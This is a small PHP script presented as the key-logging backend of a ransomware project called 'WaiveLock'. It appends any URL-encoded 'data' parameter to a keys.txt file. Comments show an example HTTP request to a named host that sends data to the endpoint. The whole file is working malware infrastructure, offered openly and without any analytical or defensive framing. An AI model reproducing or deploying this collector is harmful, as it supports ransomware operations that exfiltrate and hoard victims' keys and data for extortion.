<?php
  $content = $_GET['data'];
  $fo = fopen("keys.txt", "a");
  $fw = fwrite($fo, "$content\n");
  fclose($fo);

echo 'WaiveLock Ransomware @ github.com/waived/waivelock'
?>

// Send a GET request via HTTP and parse data into  /log.php?data=<your string here>
// Parsed data must be URL-encoded (Aka 'perfect encoded')

// Example:
// GET /log.php?data=This%20is%20a%20test HTTP/1.1\r\n
// Host: www.rware-industries.com\r\n
// User-Agent: Mozilla/13.37\r\n
// Content-Type: test/html; charset=iso-8859-l\r\n
// \r\n\r\n
